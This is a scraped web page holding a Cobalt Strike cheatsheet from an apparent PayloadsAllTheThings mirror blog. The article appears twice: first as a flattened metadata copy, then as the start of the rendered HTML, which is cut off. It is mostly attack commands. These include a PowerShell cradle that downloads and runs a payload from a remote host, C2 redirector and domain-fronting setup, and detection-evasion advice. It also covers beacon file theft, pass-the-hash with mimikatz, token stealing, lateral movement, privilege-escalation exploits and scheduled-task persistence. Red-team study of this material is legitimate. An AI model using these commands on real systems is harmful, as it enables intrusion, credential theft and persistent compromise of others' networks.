net.webclient).downloadstring(&#39;http://campaigns.example.com/download/dnsback&#39;))&quot; Summary Infrastructure Redirectors Domain fronting OpSec Payloads DNS Beacon SMB Beacon Metasploit compatibility Custom Payloads Malleable C2 Files Powershell and .NET Powershell commabds .NET remote execution Lateral Movement VPN &amp; Pivots Kits Elevate Kit Persistence Kit Resource Kit Artifact Kit References Infrastructure Redirectors 1 2 sudo apt install socat socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80 Domain Fronting New Listener &gt; HTTP Host Header Target Finance &amp; Healthcare domains OpSec Don’t Change default self-signed HTTPS certificate Change default port (50050) 0.0.0.0 DNS response Metasploit compatibility, ask for a payload : wget -U &quot;Internet Explorer&quot; http://127.0.0.1/vl6D Do Use a redirector (Apache, CDN, …) Firewall to only accept HTTP/S from the redirectors Firewall 50050 and access via SSH tunnel Edit default HTTP 404 page and Content type: text/plain No staging set hosts_stage to false in Malleable C2 Payload DNS Beacon Edit the Zone File for the domain Create an A record for Cobalt Strike system Create an NS record that points to FQDN of your Cobalt Strike system Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server’s A record. nslookup jibberish.beacon polling.campaigns.domain.com nslookup jibberish.beacon campaigns.domain.com Example of DNS on Digital Ocean: 1 2 3 NS example.com directs to 10.10.10.10. 86400 NS polling.campaigns.example.com directs to campaigns.example.com. 3600 A campaigns.example.com directs to 10.10.10.10 3600 1 2 3 4 5 systemctl disable systemd-resolved systemctl stop systemd-resolved rm /etc/resolv.conf echo &quot;nameserver 8.8.8.8&quot; &gt; /etc/resolv.conf echo &quot;nameserver 8.8.4.4&quot; &gt;&gt; /etc/resolv.conf Configuration: host: campaigns.domain.com beacon: polling.campaigns.domain.com Interact with a beacon, and sleep 0 SMB Beacon 1 2 3 4 link [host] [pipename] connect [host] [port] unlink [host] [PID] jump [exec] [host] [pipe] SMB Beacon uses Named Pipes. You might encounter these error code while running it. Error Code Meaning Description 2 File Not Found There is no beacon for you to link to 5 Access is denied Invalid credentials or you don’t have permission 53 Bad Netpath You have no trust relationship with the target system. It may or may not be a beacon there. SSH Beacon 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # deploy a beacon beacon&gt; help ssh Use: ssh [target:port] [user] [pass] Spawn an SSH client and attempt to login to the specified target beacon&gt; help ssh-key Use: ssh [target:port] [user] [/path/to/key.pem] Spawn an SSH client and attempt to login to the specified target # beacon&#39;s commands upload Upload a file download Download a file socks Start SOCKS4a server to relay traffic sudo Run a command via sudo rportfwd Setup a reverse port forward shell Execute a command via the shell Metasploit compatibility Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https Set LHOST and LPORT to the beacon Set DisablePayloadHandler to True Set PrependMigrate to True exploit -j Custom Payloads https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c 1 2 3 4 5 * Attacks &gt; Packages &gt; Payload Generator * Attacks &gt; Packages &gt; Scripted Web Delivery (S) $ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor $ C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Windows\\Temp\\dns_raw_stageless_x64.xml $ %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe \\\\10.10.10.10\\Shared\\dns_raw_stageless_x86.xml Malleable C2 Cobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2 Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles 1 2 3 4 5 6 7 8 9 10 set useragent &quot;SOME AGENT&quot;; # GOOD set useragent &#39;SOME AGENT&#39;; # BAD prepend &quot;This is an example;&quot;; # Escape Double quotes append &quot;here is \\&quot;some\\&quot; stuff&quot;; # Escape Backslashes append &quot;more \\\\ stuff&quot;; # Some special characters do not need escaping prepend &quot;!@#$%^&amp;*()&quot;; Check a profile with ./c2lint. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 # # Etumbot Profile # http://www.arbornetworks.com/asert/2014/06/illuminating-the-etumbot-apt-backdoor/ # # Author: @harmj0y # set sample_name &quot;Etumbot&quot;; set sleeptime &quot;5000&quot;; set jitter &quot;0&quot;; set maxdns &quot;255&quot;; set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;; http-get { set uri &quot;/image/&quot;; client { header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8&quot;; header &quot;Referer&quot; &quot;http://www.google.com&quot;; header &quot;Pragma&quot; &quot;no-cache&quot;; header &quot;Cache-Control&quot; &quot;no-cache&quot;; metadata { netbios; append &quot;-.jpg&quot;; uri-append; } } server { header &quot;Content-Type&quot; &quot;img/jpg&quot;; header &quot;Server&quot; &quot;Microsoft-IIS/6.0&quot;; header &quot;X-Powered-By&quot; &quot;ASP.NET&quot;; output { base64; print; } } } http-post { set uri &quot;/history/&quot;; client { header &quot;Content-Type&quot; &quot;application/octet-stream&quot;; header &quot;Referer&quot; &quot;http://www.google.com&quot;; header &quot;Pragma&quot; &quot;no-cache&quot;; header &quot;Cache-Control&quot; &quot;no-cache&quot;; id { netbiosu; append &quot;.asp&quot;; uri-append; } output { base64; print; } } server { header &quot;Content-Type&quot; &quot;img/jpg&quot;; header &quot;Server&quot; &quot;Microsoft-IIS/6.0&quot;; header &quot;X-Powered-By&quot; &quot;ASP.NET&quot;; output { base64; print; } } } Files 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # List the file on the specified directory beacon &gt; ls &lt;C:\\Path&gt; # Change into the specified working directory beacon &gt; cd [directory] # Delete a file\\folder beacon &gt; rm [file\\folder] # File copy beacon &gt; cp [src] [dest] # Download a file from the path on the Beacon host beacon &gt; download [C:\\filePath] # Lists downloads in progress beacon &gt; downloads # Cancel a download currently in progress beacon &gt; cancel [*file*] # Upload a file from the attacker to the current Beacon host beacon &gt; upload [/path/to/file] Powershell and .NET Powershell commands 1 2 3 4 5 6 7 8 9 10 11 # Import a Powershell .ps1 script from the control server and save it in memory in Beacon beacon &gt; powershell-import [/path/to/script.ps1] # Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned. beacon &gt; powershell [commandlet][arguments] # Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto beacon &gt; powerpick [commandlet] [argument] # Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs beacon &gt; psinject [pid][arch] [commandlet] [arguments] .NET remote execution Run a local .NET executable as a Beacon post-exploitation job. Require: Binaries compiled with the “Any CPU” configuration. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 beacon &gt; execute-assembly [/path/to/script.exe] [arguments] beacon &gt; execute-assembly /home/audit/Rubeus.exe [*] Tasked beacon to run .NET program: Rubeus.exe [+] host called home, sent: 318507 bytes [+] received output: ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.4.2 Lateral Movement :warning: OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe portscan: Performs a portscan on a spesific target. runas: A wrapper of runas.exe, using credentials you can run a command as another user. pth: By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. :exclamation: This module needs Administrator privileges. steal_token: Steal a token from a specified process. make_token: By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user. jump: Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. :exclamation: The jump module will use the current delegation/impersonation token to authenticate on the remote target. :muscle: We can combine the jump module with the make_token or pth module for a quick “jump” to another target on the network. remote-exec: Execute a command on a remote target using psexec, winrm or wmi. :exclamation: The remote-exec module will use the current delegation/impersonation token to authenticate on the remote target. ssh/ssh-key: Authenticate using ssh with password or private key. Works for both linux and windows hosts. :warning: All the commands launch powershell.exe 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Beacon Remote Exploits ====================== jump [module] [target] [listener] psexec x86 Use a service to run a Service EXE artifact psexec64 x64 Use a service to run a Service EXE artifact psexec_psh x86 Use a service to run a PowerShell one-liner winrm x86 Run a PowerShell script via WinRM winrm64 x64 Run a PowerShell script via WinRM Beacon Remote Execute Methods ============================= remote-exec [module] [target] [command] Methods Description ------- ----------- psexec Remote execute via Service Control Manager winrm Remote execute via WinRM (PowerShell) wmi Remote execute via WMI (PowerShell) Opsec safe Pass-the-Hash: mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:&quot;powershell -w hidden&quot; steal_token PID Assume Control of Artifact Use link to connect to SMB Beacon Use connect to connect to TCP Beacon VPN &amp; Pivots :warning: Covert VPN doesn’t work with W10, and requires Administrator access to deploy. Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon’s sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second. 1 2 3 4 5 6 7 8 # Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage. beacon &gt; socks [PORT] # Proxy browser traffic through a specified Internet Explorer process. beacon &gt; browserpivot [pid] [x86|x64] # Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port. beacon &gt; rportfwd [bind port] [forward host] [forward port] Kits Elevate Kit UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018) 1 2 3 4 5 6 7 8 9 10 11 12 13 beacon&gt; runasadmin Beacon Command Elevators ======================== Exploit Description ------- ----------- ms14-058 TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113) ms15-051 Windows ClientCopyImage Win32k Exploit (CVE 2015-1701) ms16-016 mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051) svc-exe Get SYSTEM via an executable run as a service uac-schtasks Bypass UAC with schtasks.exe (via SilentCleanup) uac-token-duplication Bypass UAC with Token Duplication Persistence Kit https://github.com/0xthirteen/MoveKit https://github.com/fireeye/SharPersist 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # List persistences SharPersist -t schtaskbackdoor -m list SharPersist -t startupfolder -m list SharPersist -t schtask -m list # Add a persistence SharPersist -t schtaskbackdoor -c &quot;C:\\Windows\\System32\\cmd.exe&quot; -a &quot;/c calc.exe&quot; -n &quot;Something Cool&quot; -m add SharPersist -t schtaskbackdoor -n &quot;Something Cool&quot; -m remove SharPersist -t service -c &quot;C:\\Windows\\System32\\cmd.exe&quot; -a &quot;/c calc.exe&quot; -n &quot;Some Service&quot; -m add SharPersist -t service -n &quot;Some Service&quot; -m remove SharPersist -t schtask -c &quot;C:\\Windows\\System32\\cmd.exe&quot; -a &quot;/c calc.exe&quot; -n &quot;Some Task&quot; -m add SharPersist -t schtask -c &quot;C:\\Windows\\System32\\cmd.exe&quot; -a &quot;/c calc.exe&quot; -n &quot;Some Task&quot; -m add -o hourly SharPersist -t schtask -n &quot;Some Task&quot; -m remove Resource Kit The Resource Kit is Cobalt Strike’s means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows Artifact Kit Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -&gt; Script Manager, and load the artifact.cna script from that technique’s folder. Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 : Download the artifact kit : Go to Help -&gt; Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike) Install the dependencies : sudo apt-get install mingw-w64 Edit the Artifact code Change pipename strings Change VirtualAlloc in patch.c/patch.exe, e.g: HeapAlloc Change Import Build the Artifact Cobalt Strike -&gt; Script Manager &gt; Load .cna References Red Team Ops with Cobalt Strike (1 of 9): Operations Red Team Ops with Cobalt Strike (2 of 9): Infrastructure Red Team Ops with Cobalt Strike (3 of 9): C2 Red Team Ops with Cobalt Strike (4 of 9): Weaponization Red Team Ops with Cobalt Strike (5 of 9): Initial Access Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement Red Team Ops with Cobalt Strike (9 of 9): Pivoting A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019 TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE – UB 2018 - NOV 25 2018 Cobalt Strike - DNS Beacon How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>Cobalt strike   cheatsheet | PayloadsAllTheThings
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="PayloadsAllTheThings">
<meta name="application-name" content="PayloadsAllTheThings">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- Google Tag and Analytics -->
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BJ57VSC3B5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BJ57VSC3B5');
</script>
<!-- Translate website -->
<script>
/*
  function googleTranslateElementInit() {

  new google.translate.TranslateElement(
    {
      pageLanguage: "en",
      includedLanguages: "en,id",
      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
    },
    "google_translate_element"
  );
}
setTimeout( function() {
  googleTranslateElementInit();
  }, 500);
*/
</script>
  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->
<!-- <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>





</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/logo.jpg" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">PayloadsAllTheThings</a>
    </div>

    <div class="site-subtitle font-italic">A list of useful payloads</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/Zxce3" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/Zxce3_" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['Zxce3','protonmail.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        class="order-6"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>Cobalt strike   cheatsheet</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->






<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Cobalt strike   cheatsheet</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Zxce3
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sat, Jan 30, 2021, 12:00 AM +0700"
  

  
  prep="on" >

  
  

  
    Jan 30, 2021
  

  <i class="unloaded">2021-01-30T00:00:00+07:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2275 words">12 min reads</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <h1 id="cobalt-strike">Cobalt Strike</h1>

<blockquote>
  <p>Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.</p>
</blockquote>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="nx">apt-get</span><span class="w"> </span><span class="nx">update</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="nx">apt-get</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">openjdk-11-jdk</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="nx">apt</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">proxychains</span><span class="w"> </span><span class="nx">socat</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="nx">update-java-alternatives</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">java-1.11.0-openjdk-amd64</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">.</span><span class="nx">/teamserver</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="p">[</span><span class="n">malleable</span><span class="w"> </span><span class="n">C2</span><span class="w"> </span><span class="n">profile</span><span class="p">]</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="o">.</span><span class="n">/cobaltstrike</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"IEX ((new-object net.webclient).downloadstring('http://campaigns.example.com/download/dnsback'))"</span><span class="w"> 
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="summary">Summary</h2>

<ul>
  <li><a href="#infrastructure">Infrastructure</a>
    <ul>
      <li><a href="#redirectors">Redirectors</a></li>
      <li><a href="#domain-fronting">Domain fronting</a></li>
      <li><a href="#opsec">OpSec</a></li>
    </ul>
  </li>
  <li><a href="#payloads">Payloads</a>
    <ul>
      <li><a href="#dns-beacon">DNS Beacon</a></li>
      <li><a href="#smb-beacon">SMB Beacon</a></li>
      <li><a href="#metasploit-compatibility">Metasploit compatibility</a></li>
      <li><a href="#custom-payloads">Custom Payloads</a></li>
    </ul>
  </li>
  <li><a href="#malleable-c2">Malleable C2</a></li>
  <li><a href="#files">Files</a></li>
  <li><a href="#powershell-and-net">Powershell and .NET</a>
    <ul>
      <li><a href="#powershell-commands">Powershell commabds</a></li>
      <li><a href="#net-remote-execution">.NET remote execution</a></li>
    </ul>
  </li>
  <li><a href="#lateral-movement">Lateral Movement</a></li>
  <li><a href="#vpn--pivots">VPN &amp; Pivots</a></li>
  <li><a href="#kits">Kits</a>
    <ul>
      <li><a href="#elevate-kit">Elevate Kit</a></li>
      <li><a href="#persistence-kit">Persistence Kit</a></li>
      <li><a href="#resource-kit">Resource Kit</a></li>
      <li><a href="#artifact-kit">Artifact Kit</a></li>
    </ul>
  </li>
  <li><a href="#references">References</a></li>
</ul>

<h2 id="infrastructure">Infrastructure</h2>

<h3 id="redirectors">Redirectors</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">sudo</span><span class="w"> </span><span class="nx">apt</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">socat</span><span class="w">
</span><span class="n">socat</span><span class="w"> </span><span class="nx">TCP4-LISTEN:80</span><span class="p">,</span><span class="nx">fork</span><span class="w"> </span><span class="nx">TCP4:</span><span class="p">[</span><span class="n">TEAM</span><span class="w"> </span><span class="n">SERVER</span><span class="p">]:</span><span class="nx">80</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="domain-fronting">Domain Fronting</h3>

<ul>
  <li>New Listener &gt; HTTP Host Header</li>
  <li>Target Finance &amp; Healthcare domains</li>
</ul>

<h3 id="opsec">OpSec</h3>

<p><strong>Don’t</strong></p>
<ul>
  <li>Change default self-signed HTTPS certificate</li>
  <li>Change default port (50050)</li>
  <li>0.0.0.0 DNS response</li>
  <li>Metasploit compatibility, ask for a payload : <code class="language-plaintext highlighter-rouge">wget -U "Internet Explorer" http://127.0.0.1/vl6D</code></li>
</ul>

<p><strong>Do</strong></p>
<ul>
  <li>Use a redirector (Apache, CDN, …)</li>
  <li>Firewall to only accept HTTP/S from the redirectors</li>
  <li>Firewall 50050 and access via SSH tunnel</li>
  <li>Edit default HTTP 404 page and Content type: text/plain</li>
  <li>No staging <code class="language-plaintext highlighter-rouge">set hosts_stage</code> to <code class="language-plaintext highlighter-rouge">false</code> in Malleable C2</li>
</ul>

<h2 id="payload">Payload</h2>

<h3 id="dns-beacon">DNS Beacon</h3>

<ul>
  <li>Edit the Zone File for the domain</li>
  <li>Create an A record for Cobalt Strike system</li>
